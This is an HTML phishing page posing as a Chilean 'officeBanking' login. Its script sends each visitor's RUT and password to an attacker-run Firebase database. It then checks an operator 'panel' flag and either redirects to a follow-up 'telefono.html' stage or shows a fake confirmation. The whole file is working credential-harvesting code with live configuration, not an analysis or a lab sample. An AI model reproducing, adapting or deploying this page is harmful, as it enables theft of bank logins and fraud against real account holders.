
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ingreso a officeBanking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      background-color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      height: 100vh;
    }
    .form-box {
      border: 2px solid red;
      padding: 20px;
      border-radius: 10px;
      background-color: white;
      max-width: 300px;
      width: 100%;
    }
    h2 {
      margin-bottom: 20px;
      font-size: 20px;
    }
    .title {
      font-weight: bold;
      font-size: 22px;
      margin-bottom: 20px;
    }
    .black {
      color: black;
    }
    .red-box {
      background-color: black;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      display: inline-block;
      margin-left: 4px;
    }
    input {
      max-width: 240px;
      display: block;
      margin-left: auto;
      margin-right: auto;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 2px solid black;
      border-radius: 5px;
      font-size: 16px;
    }
    .input-container {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 14px;
      cursor: pointer;
    }
    #mensajeFinal {
      color: red;
      font-weight: bold;
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    button {
      background-color: red;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <div class="title">
      <span class="black">Ingreso a</span><span class="red-box">officeBanking</span>
    </div>
    <form id="formulario">
      <input type="text" id="rut" placeholder="RUT" required>
      <div class="input-container">
        <input type="password" id="clave" placeholder="Contrase√±a" required>
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
      <button type="submit">Ingresar</button>
    </form>
    <div id="mensajeFinal">Hemos recibido tu solicitud correctamente</div>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function togglePassword() {
      const input = document.getElementById("clave");
      input.type = input.type === "password" ? "text" : "password";
    }

    function formatoRut(rut) {
      return rut.replace(/^0+|[^0-9kK]+/g, '').toUpperCase()
                .replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.')
                .replace(/\.(?=\d{1,2}$)/, '-') || rut;
    }

    document.getElementById("formulario").addEventListener("submit", async function(e) {
      e.preventDefault();
      const rut = document.getElementById("rut").value.trim();
      const clave = document.getElementById("clave").value.trim();
      const timestamp = Date.now();
      const fecha = new Date().toLocaleString("es-CL");

      const ref = db.ref("registros").push();
      await ref.set({ rut, clave, timestamp, fecha });

      // Consultamos si el panel est√° activo o inactivo
      db.ref("estado_panel/modo").once("value", snapshot => {
        const modo = snapshot.val();
        if (modo === "activo") {
          window.location.href = "telefono.html";
        } else {
          document.getElementById("formulario").style.display = "none";
          document.getElementById("mensajeFinal").style.display = "block";
        }
      });
    });
  </script>
</body>
</html>
